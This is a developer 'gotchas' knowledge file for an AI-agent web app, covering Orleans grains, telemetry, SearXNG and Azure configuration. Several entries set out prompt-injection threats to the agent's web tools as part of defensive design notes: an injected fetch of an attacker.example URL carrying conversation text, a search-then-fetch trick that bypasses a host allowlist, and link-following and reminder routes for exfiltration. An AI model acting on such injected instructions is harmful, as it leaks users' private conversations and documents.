# Gotchas & exemplars

The ONLY prose knowledge file in this repo. Two kinds of entries, both cheap to
verify and dated. Add entries via `/gotcha`; re-verify via `/audit-docs`.
Rule of thumb: if the code can express it (types, lint rule, test), it does NOT
belong here. Only constraints invisible in the code itself.

**Size guardrail:** this file describes the *present*, not history (history lives in
`.agentic/decisions/`), so it should hover around equilibrium — roughly ≤40 entries.
Beyond that, do NOT split first: audit for entries that should be lint rules, ADRs,
or deletions (a bloated gotchas file almost always means the admission test lapsed).
Only if 40+ entries survive that audit, split by area into `.agentic/gotchas/<area>.md`
and turn this file into a one-line-per-area index.

Format — every entry MUST have `evidence:` (a repo path) and `verified:` (date):

## Exemplars (canonical shapes — copy these, don't invent)

| Shape                                          | Exemplar                                          | Verified   |
|------------------------------------------------|---------------------------------------------------|------------|
| Orleans grain (state + reminders + agent tools) | `src/Agent42.Agents/Conversations/AgentGrain.cs` | 2026-08-18 |
| Feature-sliced partial of a large grain          | `src/Agent42.Agents/Web/AgentGrain.WebTools.cs`   | 2026-08-18 |
| Per-user registry grain (list-in-state)         | `src/Agent42.Agents/StoredAgents/AgentRegistryGrain.cs`        | 2026-07-07 |
| Per-user singleton-preference grain (get/save)  | `src/Agent42.Agents/Users/UserProfileGrain.cs`          | 2026-07-08 |
| Minimal-API endpoint group                      | `src/Agent42.Backend/Users/AgentApi.Users.cs`      | 2026-08-18 |
| Endpoint composition root (registers groups)     | `src/Agent42.Backend/Api/AgentApi.cs`             | 2026-08-18 |
| Grain test (shared TestCluster + fake client)   | `tests/Agent42.Tests/SharedClusterTests.cs`, `tests/Agent42.Tests/UserProfileGrainTests.cs` | 2026-08-27 |
| API test (shared cluster + one MapAgentApi host) | `tests/Agent42.Tests/SharedApiFixture.cs`, `tests/Agent42.Tests/McpServersApiTests.cs` | 2026-08-27 |
| Bicep module                                    | `infra/modules/cosmos.bicep`                      | 2026-07-06 |
| Frontend feature module (vanilla JS, no build)  | `src/Agent42.Backend/wwwroot/js/conversations.js` | 2026-08-19 |
| Frontend composition root (wires every module)  | `src/Agent42.Backend/wwwroot/js/main.js`          | 2026-08-19 |
| Storage abstraction (interface + prod + in-mem) | `src/Agent42.Agents/Attachments/IAttachmentStore.cs`, `src/Agent42.Agents/Attachments/InMemoryAttachmentStore.cs`, `src/Agent42.Backend/Attachments/BlobAttachmentStore.cs` | 2026-07-08 |
| PWA service worker (root scope, auth-safe)      | `src/Agent42.Backend/wwwroot/sw.js`               | 2026-07-06 |
| Runtime agent skill (progressive disclosure)    | `src/Agent42.Agents/Skills/scheduledprompt/SKILL.md` | 2026-07-06 |
| Keyed third-party HTTP client behind an Agents interface | `src/Agent42.Backend/Web/ContextWebPageFetcher.cs`, `src/Agent42.Backend/Location/GoogleGeocoder.cs` | 2026-07-21 |

## Constraints

### Chrome on Android flags interim speech results as `isFinal` with `confidence: 0`

- **Claim:** Voice dictation cannot be verified on desktop alone. Desktop Edge/Chrome and
  Chrome-on-Android deviate from the Web Speech spec in *different* ways, and a transcript
  fold correct on one stacks growth stages ("Hoe" + "Hoe laat" + …) on the other — the
  double-output bug on Android PWAs. On Android every interim stage arrives `isFinal: true`
  with `confidence: 0`; promoting it into the permanent `finalTranscript` accumulator (which
  never revisits what it appended) re-adds each stage. Only the interim branch is
  self-correcting (rebuilt per event), so an unscored result must fall through to it — hence
  the `distrustZeroConfidenceFinals` UA guard in the result handler. The guard must stay
  Android-only: desktop engines may report `confidence: 0` on a genuine final, and demoting it
  there silently drops the segment. The C# asset tests are source-text heuristics (no JS
  runner in repo), so they cannot catch an engine deviation — always retest dictation on a
  real Android PWA.
- **Evidence:** `src/Agent42.Backend/wwwroot/js/speech.js` (`distrustZeroConfidenceFinals`);
  upstream precedent: `react-speech-recognition` `RecognitionManager.js`
- **Verified:** 2026-07-09

### A browser's upload Content-Type is unreliable for documents — resolve by extension

- **Claim:** the document-upload handler must NOT trust `IFormFile.ContentType` alone. Windows has
  no registered MIME type for many document extensions, so browsers send `application/octet-stream`
  (or an empty type) for `.docx`/`.pptx`/`.xlsx`/`.md` and even `.txt`, and OOXML files sometimes
  arrive as `application/zip`. Branching straight on the raw content type rejected real documents as
  "unsupported" (HTTP 400) — and the grain was never told the document existed, so the model stayed
  unaware. (`handleFiles` used to swallow the non-OK response silently; it now surfaces it as an
  `attach-chip--error` chip, so a wrongly-rejected document is at least visible — but the fix is to
  not misclassify it in the first place.) Resolve the effective type via `DocumentMediaTypes.ResolveMediaType(fileName,
  contentType)` (extension fallback) before the image/document branch, and feed the *resolved* type
  into ingestion so the extractor's switch matches. `.pdf` usually reports correctly, so a PDF-only
  test does not catch this — cover a generic/empty content type.
- **Evidence:** `src/Agent42.Backend/Attachments/AgentApi.Attachments.cs` (`ResolveMediaType` call before branching),
  `src/Agent42.Agents/Documents/DocumentMediaTypes.cs`,
  `tests/Agent42.Tests/DocumentMediaTypesTests.cs`
- **Verified:** 2026-07-10

### Easy Auth claim `typ` spellings for `user.*` telemetry are a prod-only fact

- **Claim:** the `user.email`/`user.full_name`/`user.roles` trace attributes (ADR 0009) are pulled
  from the `X-MS-CLIENT-PRINCIPAL` claims blob by matching each claim's `typ` against a **candidate
  list** in `CurrentUser.cs` (AAD v1/v2 and Easy Auth's own mapping spell them differently). Easy
  Auth is **absent locally** (ADR 0002 — DevHost doesn't even call `AddServiceDefaults`), so the
  real blob shape and `typ` spellings **cannot be verified offline**: the unit tests use a synthetic
  base64 blob built from the candidate `typ` values, which proves the parser, not the prod mapping.
  If an attribute is missing on a real trace at the collector after deploy, the claim `typ` is wrong
  for the tenant — add the observed spelling to the candidate list here; that is a config fact, not a
  code bug. `user.id`/`user.name`/`user.idp` come from plain headers and are not affected. Parsing is
  defensive: a missing/non-base64/non-JSON blob never throws — header attributes still emit.
- **Evidence:** `src/Agent42.Backend/Api/CurrentUser.cs` (`EmailClaimTypes`/`FullNameClaimTypes`/`RoleClaimTypes`, `ParsePrincipalClaims`), `tests/Agent42.Tests/UserTelemetryTests.cs`, `.agentic/decisions/0009-user-identity-telemetry-attributes.md`
- **Verified:** 2026-07-11

### User identity reaches downstream/grain spans via Orleans RequestContext, never Activity.Baggage

- **Claim:** downstream `user.*` span attribution (ADR 0010) propagates the identity to the grain-side
  chat-completion span through **Orleans `RequestContext`** (`UserTelemetryMiddleware` sets a serializable
  `UserTelemetryContext` first in the pipeline; `UserTelemetrySpanProcessor.OnStart` stamps every started
  span from it). It must **never** be `Activity.Baggage`: the default `DistributedContextPropagator`
  injects a W3C `baggage` request header on outbound HttpClient calls, which would ship user PII
  (name/email/roles) to **Azure OpenAI** in headers. `RequestContext` is an in-cluster channel (Orleans'
  own protocol, never an external HTTP header), so identity reaches the grain without leaking outward —
  the load-bearing reason for the design. This is the **one** `RequestContext` use in the repo.
  `NoBaggageWriteApi_IsUsedInTelemetryPath` guards against `SetBaggage`/`AddBaggage` creeping in.
- **Load-bearing behaviour:** Orleans 10.2 propagates `RequestContext` into the *streaming* `ChatAsync`
  grain path by default. That is **not** self-evident and is guarded by `RequestContextPropagationTests`
  (a `FakeChatClient` `[uctx:…]` echo read at the in-grain chat-client call site). If an Orleans upgrade
  flips that default, that test fails first — restore propagation (silo config or a grain-call-filter
  pair) before shipping. The actual OTel stamp on a real in-grain span is prod-smoke (no OTel host offline).
- **Evidence:** `src/Agent42.Backend/Telemetry/UserTelemetryMiddleware.cs`, `src/Agent42.Backend/Telemetry/UserTelemetrySpanProcessor.cs`, `src/Agent42.Agents/Telemetry/UserTelemetryContext.cs`, `tests/Agent42.Tests/RequestContextPropagationTests.cs`, `.agentic/decisions/0010-downstream-user-telemetry-via-requestcontext.md`
- **Verified:** 2026-07-11

### Trace-parent linkage across a grain call needs `AddActivityPropagation` — RequestContext propagation is NOT it

- **Claim:** Orleans propagates `RequestContext` across grain calls **by default** (the `user.*` identity
  channel above relies on that), but it does **NOT** propagate the W3C trace context (`Activity.Current`)
  unless the silo opts in with **`silo.AddActivityPropagation()`** (in `Program.cs`'s `UseOrleans`). These are
  two different mechanisms — having the first does not give you the second. Grain calls hop through the
  Orleans scheduler, which does not flow `Activity.Current` across the boundary, so **without** this call
  every span started *inside* a grain (the `HttpClientInstrumentation` span for the chat-completion /
  geocoding / web-fetch calls) begins as a **new root span** — the "many traces have no parent" symptom. The
  symptom is easy to miss because the `user.*` attributes still land on those orphaned spans (they ride
  RequestContext, not the trace parent).
- **Load-bearing behaviour:** the backend **co-hosts** silo + client in one DI container, so the single
  `silo.AddActivityPropagation()` registers **both** the incoming filter (starts the child span) and the
  outgoing filter (injects `Activity.Current` on the call) — one call covers both directions. A `TestCluster`
  splits client and silo into **separate** containers, so a test must configure **both**
  (`AddSiloBuilderConfigurator` + `AddClientBuilderConfigurator`) to reproduce what co-hosting gives for free —
  configuring only the silo makes the outgoing injection silently absent and the trace never propagates.
  `ActivityPropagationTests` guards this: a positive (root trace reaches the in-grain chat-client site via the
  `FakeChatClient` `[trace:…]` echo) and a negative (no propagation → no marker → the fix is load-bearing).
  The async paths (fired reminders, agent-run — ADR 0022/0028) still begin fresh roots **by design**: they
  have no ambient inbound Activity, so their rootlessness is correct, not this bug.
- **Evidence:** `src/Agent42.Backend/Program.cs` (`silo.AddActivityPropagation()`), `tests/Agent42.Tests/ActivityPropagationTests.cs`, `tests/Agent42.Tests/FakeChatClient.cs` (`TraceEcho`)
- **Verified:** 2026-07-21

### An agent tool's RETURN value is persisted, and counts against the 2 MB session cap

- **Claim:** it is easy to see that chat messages are persisted and miss that **tool results are too**.
  A `FunctionResultContent` stays in the Agent Framework chat history (`AgentGrain`'s storage filter
  excludes only `AIContextProvider` and `ChatHistory` source types), and the grain re-serializes the
  whole session into **one `agent-state` Cosmos item every turn** — hard-capped at **2 MB** (ADR 0004).
  So a tool that returns a big payload does not merely bloat one reply: the payload sits in history
  forever, is re-sent to the model on every later turn, and eventually makes `WriteStateAsync` fail
  *after* the model has already answered — bricking the conversation, silently, **in prod only** (the
  in-memory test store has no 2 MB limit). **Therefore every web tool budgets what it RETURNS**, in
  `WebToolLimits`: a search ≤ 5 results × ≤ 300-char snippets, and a fetched page ≤ 8 KB of text
  (`MaxPageTextLength`). The **return** budget is separate from what a fetch pulls off the wire — the
  distinction is load-bearing, but the anchor moved: the old `WebPageFetcher.MaxDownloadBytes` transport
  cap is gone with the direct fetch (ADR 0027). Now context.dev renders the page and returns bounded
  markdown, which we then truncate on the way back. **And following (ADR 0027) moved the return ceiling:**
  one fetch can return the root *plus* up to `MaxFollowedLinks` pages, so the budget that binds is
  `MaxTotalPageTextLength` (across root + followed), not `MaxPageTextLength` alone. Any new tool — or any
  new page added to a fetch result — must count its return payload against this budget.
- **Evidence:** `src/Agent42.Agents/Web/WebToolLimits.cs`,
  `src/Agent42.Agents/Web/AgentGrain.WebTools.cs` (`BuildFetchPayload`),
  `src/Agent42.Agents/Documents/AgentGrain.Documents.cs` (`ExcludeInjectedContextMessages`),
  `src/Agent42.Agents/Conversations/AgentGrain.cs` (`ChatAsync`, and `ChatCoreAsync`'s
  `SerializeSessionAsync`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`ToolResults_DoNotBlowTheSessionSizeBudget`),
  `.agentic/decisions/0004-attachments-in-blob.md`, `.agentic/decisions/0027-hosted-page-scrape-via-context-dev.md`
- **Verified:** 2026-07-21

### A continuous agent funnels every chat into one unbounded grain — it will eventually brick

- **Claim:** an agent with `Continuous = true` (ADR 0016) routes **every** start onto one deterministic
  conversation id `` `agent-${agent.id}` `` → one grain `{userId}/agent-{agentId}`. That grain never rotates:
  it re-serializes its whole session into a single `agent-state` Cosmos item every turn, hard-capped at 2 MB
  (see the "an agent tool's RETURN value is persisted" gotcha above). Per-chat agents bound each conversation;
  a continuous one grows without bound (text + tool results + image refs + RAG excerpts, replayed every turn)
  and will eventually fail `WriteStateAsync` *after* the model has already answered — bricking the conversation,
  silently, **in prod only** (the in-memory test store has no 2 MB limit). **The only escape hatch is
  delete-to-reset:** `DELETE /api/conversations/agent-{agentId}` purges the grain and the next start recreates
  it fresh at the same id. No code cap is in scope. Two further non-obvious traps: (1) the flag is read
  **client-side at chat-start and is never snapshotted into `AgentBinding`** (it's routing, not persona), so
  editing a continuous agent's system prompt or model has **zero effect** on its ongoing conversation until the
  grain is deleted — ADR 0003's "start a new chat to apply the edit" remedy does not work for a continuous
  agent. (2) `crypto.randomUUID()` never emits the `agent-` prefix, so the deterministic and random id spaces
  never collide — do not "fix" the derivation to hash or encode the id.
- **Evidence:** `src/Agent42.Backend/wwwroot/js/agents.js` (`startAgentChat`),
  `src/Agent42.Agents/StoredAgents/AgentDefinition.cs` (`Continuous`), `src/Agent42.Backend/Api/AgentApi.cs` (`AgentKey`),
  `.agentic/decisions/0016-per-agent-history-mode-deterministic-conversation-id.md`,
  `.agentic/decisions/0004-attachments-in-blob.md`, `.agentic/decisions/0003-snapshot-agent-persona-into-conversation.md`
- **Verified:** 2026-07-15

### `fetch_web_page` is NO LONGER an SSRF sink — the scrape is made by context.dev, not by us

- **Claim:** this used to be an SSRF sink and had a connect-time `PrivateAddressGuard` in
  `SocketsHttpHandler.ConnectCallback`. **That is gone** (ADR 0027). `fetch_web_page` no longer opens a
  socket to the model's URL — it hands the URL to the hosted **context.dev** scrape API, which makes the
  outbound request. Our container never dials the model-chosen address, so there is no in-container SSRF
  vector and no guard to place. The only call this path makes is to context.dev's **config-pinned** host
  (`ContextWebPageFetcher.DefaultBaseAddress`), carrying the URL as a query parameter — an ordinary API
  call. **Do not reintroduce a `PrivateAddressGuard` here** on the theory that a fetch tool needs one:
  there is nothing to guard, because the request is not ours. (The allowlist below is a *different*
  control and stays.) The old direct-fetch code, its guard, its `AngleSharp` HTML→text pass, and their
  socket-dialling tests were all deleted.
- **Evidence:** `src/Agent42.Backend/Web/ContextWebPageFetcher.cs`, `src/Agent42.Backend/Program.cs`
  (the fetch client has **no** `ConfigurePrimaryHttpMessageHandler`),
  `.agentic/decisions/0027-hosted-page-scrape-via-context-dev.md`,
  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md` (amendment note)
- **Verified:** 2026-07-21

### Following links is exempt from the fetch allowlist — an accepted residual risk, opt-in and hard-capped

- **Claim:** `fetch_web_page` can follow depth-1 links whose text matches a model-supplied
  `followLinkFilter` (ADR 0027). Only the **root** URL is checked against `FetchableUrls`; a followed
  link is extracted from the page and fetched **without** the allowlist — by construction it would never
  be on it, so checking it would make following a permanent no-op. This is a **real exfiltration channel,
  not a non-risk**: the filter is conversation-derived free text, substring-matched against
  attacker-authored link text on an attacker-authored page, so a page with one link per character turns
  the filter into a selection channel, repeatable across turns — the same class of hole the whole-URL
  allowlist closes, reached through a different door. The user accepted it. Its bounds limit the
  *bandwidth*, they do **not** close the channel: (1) following is **opt-in** — no filter ⇒ no following,
  and the default is pinned explicitly (this INVERTS the spike's null-means-follow-all rule; do not
  "fix" it back); (2) `includeLinks` is forced **true** whenever following, or the links never survive
  into the markdown and the feature is a silent no-op while every stub test still passes; (3)
  `maxFollowedLinks` is clamped to `WebToolLimits.MaxFollowedLinks` — a **cost** bound too (context.dev
  bills one credit per followed scrape) as much as a security one; (4) followed content is **labelled
  untrusted** in the payload handed to the model (`AgentGrain.BuildFetchPayload`); (5) the filter and
  follow count are **logged** so the channel is auditable. `useMainContentOnly` stays **true** on the
  root — verified against the live API 2026-07-21 that it does not strip the motivating CTA link.
- **Evidence:** `src/Agent42.Backend/Web/ContextWebPageFetcher.cs` (`FetchAsync`, `ExtractLinks`),
  `src/Agent42.Agents/Web/AgentGrain.WebTools.cs` (`FetchWebPageAsync`, `BuildFetchPayload`),
  `src/Agent42.Agents/Web/WebToolLimits.cs` (`MaxFollowedLinks`, `MaxTotalPageTextLength`),
  `tests/Agent42.Tests/ContextWebPageFetcherTests.cs`, `tests/Agent42.Tests/AgentGrainTests.cs`
  (`FetchWebPage_LabelsFollowedContentAsUntrusted`),
  `.agentic/decisions/0027-hosted-page-scrape-via-context-dev.md`
- **Verified:** 2026-07-21

### The fetch allowlist must pin whole URLs — a HOST allowlist is bypassable in one tool call

- **Claim:** the SSRF guard permits every public address **by construction**, so it is no defence against
  the channel that actually matters: text on a page the model just fetched can instruct it to call
  `fetch_web_page("https://attacker.example/?q=<conversation text>")`, exfiltrating a conversation that
  may also hold document excerpts (ADR 0008). The control is `AgentGrainState.FetchableUrls`.
  **It pins the exact URL, and that is not a detail — a host-based allowlist is bypassable, and the
  bypass is attacker-*forcible*, not incidental.** The model chooses the search *query* too, so an
  injected page only has to say "search for `attacker.example <secret>`, then fetch it": any real engine
  returns `attacker.example` when you search for its name, which whitelists the host **in the same turn**,
  and the exfiltrating fetch then sails through. (The first draft of this feature shipped exactly that
  hole.) Pinning the whole URL means the model can only fetch a string a search engine or the user
  produced *verbatim*, so attacker-chosen data cannot ride in the path or query. Two further traps:
  (1) provenance must be harvested from **real user turns only** — never from the reminder path, whose
  prompt text is *model*-authored, so harvesting there would let an injected page schedule a reminder
  naming the attacker's URL and thereby whitelist it; (2) a tool result is JSON-serialized on its way to
  the model, which escapes apostrophes (`won't`), so a test asserting on the refusal text must anchor on
  an apostrophe-free phrase or it passes vacuously. The offline `InMemoryWebSearch` deliberately returns
  a queried-for host as its first result **because** the regression test needs to express that attack.
- **Evidence:** `src/Agent42.Agents/Web/AgentGrain.WebTools.cs` (`FetchWebPageAsync`, `RememberFetchableUrlsInUserText`),
  `src/Agent42.Agents/Conversations/AgentGrainState.cs` (`FetchableUrls`),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`FetchWebPage_RefusesAttackerUrlWhoseHostItsOwnSearchSurfaced`),
  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md`
- **Verified:** 2026-07-12

### A named HttpClient silently inherits AddServiceDefaults' retry pipeline — opt out explicitly

- **Claim:** `AddServiceDefaults()` calls `ConfigureHttpClientDefaults(http => http.AddStandardResilienceHandler())`,
  so **every** `HttpClient` in the Backend — including one you just registered with `AddHttpClient("name")`
  — inherits 3 retries plus the handler's own per-attempt and total timeouts. Setting `HttpClient.Timeout`
  does **not** opt out: the retry pipeline still wraps the call. `RemoveAllResilienceHandlers()` is what
  actually does. This bites the web tools (ADR 0011/0027): `AgentGrain` is **non-reentrant**, so a
  retried call multiplies the stall on a conversation's turn by four — and a context.dev scrape, which
  renders the page (and, when following, does 1 + N of them, ADR 0027), is already the slowest thing on
  the turn. (Before ADR 0027 there was a second reason — a `BlockedAddressException` from the direct-fetch
  SSRF guard surfaced as a transient `HttpRequestException` and got re-dialled — but that guard and its
  client are gone.) Note the shipped pipeline (resilience + service discovery) is assembled in `Program.cs`
  and is not what the unit tests construct, so no test will catch this for you.
- **Evidence:** `src/Agent42.ServiceDefaults/Extensions.cs` (`ConfigureHttpClientDefaults`),
  `src/Agent42.Backend/Program.cs` (`RemoveAllResilienceHandlers` on all three named clients — SearXNG
  search, the context.dev scrape client (ADR 0027) and the geocoding client (ADR 0012); every new named
  client needs it)
- **Verified:** 2026-07-21

### SearXNG is self-hosted, NOT private — it forwards every query to the upstream engines

- **Claim:** "self-hosted search" reads like "the query never leaves our infrastructure". It does leave.
  SearXNG is a ***meta*search** engine: it forwards each query to the upstream engines enabled in
  `infra/searxng/settings.yml` (currently `google`, `duckduckgo`, `bing` — read the `keep_only:` list
  **and the `engines:` override block below it**, and see the next gotcha: `keep_only` alone enables
  nothing). What self-hosting actually buys is
  **no API key, no per-query bill, and no per-user attribution** — queries arrive at the upstream engines
  unauthenticated from the container's IP. That is the claim to make; the privacy one is false, and it
  was wrong in five places in the first draft of this feature (including in the `websearch` SKILL.md,
  i.e. told to the model, and therefore to users). The consequence that matters: because the **model**
  writes the search query, `web_search` is an outbound text channel that the `fetch_web_page` URL
  allowlist does **not** cover — a prompt-injected page could put conversation text in a query. The skill
  instructs the model never to do that; it is mitigation, not prevention (ADR 0011).
- **Evidence:** `infra/searxng/settings.yml` (the `keep_only:` list **and** the `engines:` override),
  `src/Agent42.Agents/Skills/websearch/SKILL.md`, `src/Agent42.Agents/Web/IWebSearch.cs`,
  `.agentic/decisions/0011-web-search-self-hosted-searxng-sidecar.md`,
  `.agentic/decisions/0060-enable-google-and-bing-search-engines.md`
- **Verified:** 2026-08-30

### SearXNG `keep_only` enables nothing — and `inactive` is not `disabled`

- **Claim:** listing an engine under `use_default_settings.engines.keep_only` **filters** the upstream
  engine list; it does not switch anything on. For the whole life of the web-search feature the list read
  `google, duckduckgo, bing` while **DuckDuckGo was the only engine that ever answered a query** — and the
  gotcha above said "forwards every query to DuckDuckGo/Bing" — wrong on both counts, and reworded by
  ADR 0060. Two
  *different* upstream flags were doing it, and they are not interchangeable:
  **`inactive: true`** — `load_engines` skips the entry outright (`searx/engines/__init__.py:318`), so the
  engine is never registered, never appears in `/config`, is never queried, and **never shows up in
  `unresponsive_engines` either**: it fails silently and invisibly. **No setting in our `settings.yml` can
  revive it — only a base-image bump can.** That is the trap: overriding `inactive: false` on an image
  whose engine upstream marked inactive *does* flip `/config` to `enabled=True` while still returning zero
  results with no error, which looks fixed and is not (measured on `2026.7.12-c19d86faa`).
  **`disabled: true`** — the engine loads and registers, but sits out the *default* query set; it answers
  only a `!bang`. **This one our `settings.yml` can and does override.**
  To change an engine, add a top-level `engines:` entry: it is matched by `name` and `update_dict`-ed onto
  the upstream default (`searx/settings_loader.py:166-174`), so you set one key and inherit the rest —
  never copy a whole engine definition in, or the next image bump silently freezes that engine's config.
  The way to check is not to read the yaml: run the image and read **`/config`**, which lists exactly the
  engines that loaded and whether each is enabled.
- **Evidence:** `infra/searxng/settings.yml` (the `engines:` override block and its comment),
  `infra/searxng/Dockerfile` (the tag bump and why),
  `.agentic/decisions/0060-enable-google-and-bing-search-engines.md` (the before/after measurements)
- **Verified:** 2026-08-30

### SearXNG: the JSON API answers 403 unless enabled, and the port moves only via env

- **Claim:** two traps, both verified by running the image. (1) SearXNG serves **only** the formats
  listed under `search.formats` — `html` alone by default — and answers a request for an unlisted format
  with **HTTP 403**, which reads like an auth failure and sends you hunting for an API key that does not
  exist (the sidecar has no auth). `json` must be listed in `infra/searxng/settings.yml`; with it removed
  the same instance returns 403 for `?format=json` while `?format=html` returns 200. (2) **`server.port`
  in `settings.yml` is inert for the bind.** The image's entrypoint does
  `export GRANIAN_PORT="${SEARXNG_PORT:-$GRANIAN_PORT}"`, so the listener follows the **`SEARXNG_PORT`
  env var** — with only `server.port: 8888` in the config the container still listened on **8080**, which
  collides with the backend's ingress `targetPort` (containers in one Container App share a network
  namespace and talk over localhost). The port move lives in `container-app.bicep` / `AppHost.cs`, not in
  the config file. Upstream ships rolling date tags, so the Dockerfile pins an immutable one, never
  `latest`.
  (3) **A per-request `&safesearch=` parameter silently OVERRIDES the instance's `search.safe_search`.**
  `SearxngWebSearch` used to hardcode `&safesearch=1` on every query, which made `safe_search:` in
  `settings.yml` **dead config** — the file could say `0` while every actual query asked for `1`, and
  nothing said so. The client now sends no `safesearch` parameter at all, so the instance owns the policy
  and the config file means what it says. Same trap shape as `server.port` above: a setting that looks
  authoritative but is overridden elsewhere. (Current instance policy: `safe_search: 0`.)
- **Evidence:** `infra/searxng/settings.yml`, `infra/searxng/Dockerfile`,
  `infra/modules/container-app.bicep` (`SEARXNG_PORT`), `src/Agent42.Backend/Web/SearxngWebSearch.cs`
  (the 403 message names the cause; no `safesearch` on the query string)
- **Verified:** 2026-07-13

### Container Apps bills the per-replica total across ALL containers in the replica

- **Claim:** adding a sidecar is not free and not independent. Azure Container Apps bills the
  **per-replica** total, and the **sum** of CPU/memory across every container in the replica must land on
  an allowed combination (CPU in 0.25 steps, memory ≈ 2 GiB per CPU) — an invalid sum is rejected at
  deploy, not at authoring. The SearXNG sidecar took the replica from `0.5 CPU / 1Gi` to
  **`1.0 CPU / 2Gi`** (backend unchanged + sidecar `0.5/1Gi`), roughly doubling the app's compute cost.
  Replicas stay pinned at 1 (`@minValue(1) @maxValue(1)` — Orleans localhost clustering), so there is
  exactly one sidecar per deployment. `az bicep build` will not catch a bad combination; an
  `az deployment group validate` against the real RG will.
- **Evidence:** `infra/main.bicep` (`containerCpu`/`containerMemory` + `searxngCpu`/`searxngMemory`),
  `infra/modules/container-app.bicep` (two containers in `template.containers`)
- **Verified:** 2026-07-12

### A grain's turn-scoped field lives for the ACTIVATION — clear it explicitly, or a reminder reuses it

- **Claim:** `AgentGrain._turnLocation` holds the user's position for the turn being processed (ADR 0012),
  and it reads like per-call state. **It is not: a private field lives for the grain *activation*.** So
  "the reminder path just leaves it null" is *false* — `ReceiveReminder` is a separate call on the same
  activation, and after any located chat turn the field is still populated. Left alone, a scheduled prompt
  would confidently announce where the user was hours ago, from somewhere else. **Non-reentrancy is not the
  argument that makes it safe** either — `ChatAsync` is an `IAsyncEnumerable` method that suspends between
  `yield return`s. The only thing that makes it safe is clearing it explicitly, and it is cleared in *two*
  places: a `finally` in `ChatAsync` (which also runs when a client abandons the stream, on the
  enumerator's disposal) and an assignment to null on entry to `ReceiveReminder`. Each masks the other, so
  neither is individually load-bearing in the happy path — but remove **both** and
  `ReceiveReminder_HasNoUserLocation` fails (verified by mutation). Any future per-turn field on this grain
  inherits this trap; PII especially should not sit in memory between turns.
- **Evidence:** `src/Agent42.Agents/Conversations/AgentGrain.cs` (`_turnLocation`, the `finally` in `ChatAsync`, the
  clear in `ReceiveReminder`), `tests/Agent42.Tests/AgentGrainTests.cs`
  (`ReceiveReminder_HasNoUserLocation`, `Location_IsTurnScoped_AndNotPersisted`),
  `.agentic/decisions/0012-user-location-google-geocoding.md`
- **Verified:** 2026-07-13

### Ephemeral chat: `_ephemeral` is the same turn-scoped trap, and scheduling must be refused inside the tool

- **Claim:** the incognito flag (ADR 0034) is a second member of the `_turnLocation` family — a turn-scoped
  `AgentGrain` field that **lives for the activation** and must be cleared explicitly, or a warm grain's
  next (non-ephemeral) turn silently inherits it and **skips its own `WriteStateAsync`**, losing a chat the
  user expected to keep. It is cleared in `ChatAsync`'s `finally` (with `_turnLocation`) and defensively
  reset on entry to the two always-persisting async paths (`EnqueuePromptAsync`, `ReceiveReminder`).
  `EphemeralFlag_IsClearedAfterTheTurn_SoTheNextNormalTurnPersists` pins this. Two more traps in the same
  feature: **(1)** scheduling is refused **inside `SchedulePromptAsync`** (an early `if (_ephemeral) return
  …`), NOT by dropping the tool in `BuildAgent` — `BuildAgent` runs on activation *before* the first request
  sets `_ephemeral` (the same ordering hazard as `_userDefaultEnabledTools`), so a per-turn tool-list rebuild
  would be fragile; the in-tool guard has no ordering hazard and registers nothing durable (a reminder would
  otherwise fire the persisting/pushing `ReceiveReminder`). **(2)** the guarantee is "not persisted, not
  listed", **not** "not in memory": while the grain is activated its `_session` still holds the chat, so
  `GET /messages` reflects it live — the trace-free property only shows up after deactivation (asserted via
  `EphemeralChat_LeavesNoHistory_AfterReactivation`, not an empty `/messages`). Documents are blocked at the
  composer (RAG writes durable chunks); images are allowed (blob bytes persist — accepted, session-only).
- **Evidence:** `src/Agent42.Agents/Conversations/AgentGrain.cs` (`_ephemeral`; the `finally` in `ChatAsync`; the guards on
  the two `WriteStateAsync` calls in `ChatCoreAsync`/`GenerateImageTurnAsync`; the refusal in
  `SchedulePromptAsync`). **The flag is now split across part files (ADR 0039):** it is declared and
  cleared in `src/Agent42.Agents/Conversations/AgentGrain.cs`, but the write-skip it guards in
  `GenerateImageTurnAsync` lives in `src/Agent42.Agents/ImageGeneration/AgentGrain.ImageTurn.cs`, and
  the `SchedulePromptAsync` refusal in
  `src/Agent42.Agents/Scheduling/AgentGrain.Scheduling.cs` — read all three before changing any one.
  Also: `src/Agent42.Agents/Conversations/AgentGrain.cs` (the resets in
  `EnqueuePromptAsync`/`ReceiveReminder`),
  `src/Agent42.Backend/Conversations/ChatContracts.cs` (`ChatRequest.Ephemeral`, the `TouchAsync` skip),
  `src/Agent42.Backend/wwwroot/js/agents.js` (`ephemeral`, `setIncognito`), `src/Agent42.Backend/wwwroot/js/attachments.js` (the incognito document gate in
  `handleFiles`), `tests/Agent42.Tests/AgentGrainTests.cs`
  (`EphemeralChat_RunsTheTurn_ButPersistsNothing`, `EphemeralChat_LeavesNoHistory_AfterReactivation`,
  `EphemeralFlag_IsClearedAfterTheTurn_SoTheNextNormalTurnPersists`,
  `EphemeralChat_SchedulingIsRefused_NoReminderRegistered`),
  `tests/Agent42.Tests/AgentApiTests.cs` (`EphemeralChat_IsNotListedInTheSidebar`),
  `.agentic/decisions/0034-ephemeral-chat.md`
- **Verified:** 2026-07-26

### `get_current_location` is NOT an SSRF sink — and exactly two properties keep it that way

- **Claim:** it makes an outbound HTTP call from the same container whose managed identity IMDS will mint
  Cosmos/Storage/OpenAI tokens for — the setup that once made a model-chosen fetch URL dangerous — yet it
  deliberately has **no SSRF address-guard**, and adding one to "fix the asymmetry" would be cargo cult
  (and there is no longer even a `fetch_web_page` guard to be asymmetric with — ADR 0027). The claim
  rests on two properties, and **both are load-bearing**: (1) the host is **fixed** (`maps.googleapis.com`,
  config-pinned, never model-supplied), and (2) the tool takes **zero model-supplied parameters** — the
  only variable input is a lat/lon pair from the *browser*, range-validated server-side, and a `double`
  cannot inject a host. The failure mode is a later contributor dissolving property (2) without noticing:
  adding a `[Description("address to look up")] string` parameter turns this into a genuine SSRF sink
  **while the reassuring comment still sits above it**. A comment cannot defend itself, so the shape is
  pinned by `GetCurrentLocation_ExposesNoParameters`, which asserts the JSON schema the model actually sees
  has no properties. If you ever need the model to name a place, that is *forward* geocoding — a different
  tool, and it needs the guard.
- **Evidence:** `src/Agent42.Backend/Location/GoogleGeocoder.cs`, `src/Agent42.Agents/Location/AgentGrain.LocationTool.cs`
